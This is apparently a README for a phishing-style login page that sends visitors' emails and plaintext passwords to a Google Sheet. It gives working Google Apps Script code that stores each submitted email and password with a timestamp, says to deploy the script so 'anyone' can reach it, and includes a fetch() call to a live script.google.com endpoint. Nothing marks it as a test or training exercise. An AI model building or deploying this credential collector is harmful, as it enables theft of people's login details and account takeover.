# Login
collecting data of the user to an google sheet (you can change it to anything else)


at line 26, edit the link

1. create a google sheet (name something like "Login Data Log")
2. in extensions > appscript
3. (javascript) replace all with:

<pre>
 function doPost(e) {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  var email = e.parameter.email;
  var password = e.parameter.password;
  var time = new Date();

  sheet.appendRow([email, password, time]);
  return ContentService.createTextOutput("OK");
} 
</pre>

4. deploy [select "anyone" !important!]
5. copy link
6. replace it on line 26
    fetch("https://script.google.com/macros/s/AKfycby69FXNkbhLcd5sKXqb2MhQIDDH6GBLIhhCNbdYREEFDBRbHg7lQeMLDHNz1d20LR-b/exec", {

replace this part only
"https://script.google.com/macros/s/AKfycby69FXNkbhLcd5sKXqb2MhQIDDH6GBLIhhCNbdYREEFDBRbHg7lQeMLDHNz1d20LR-b/exec"
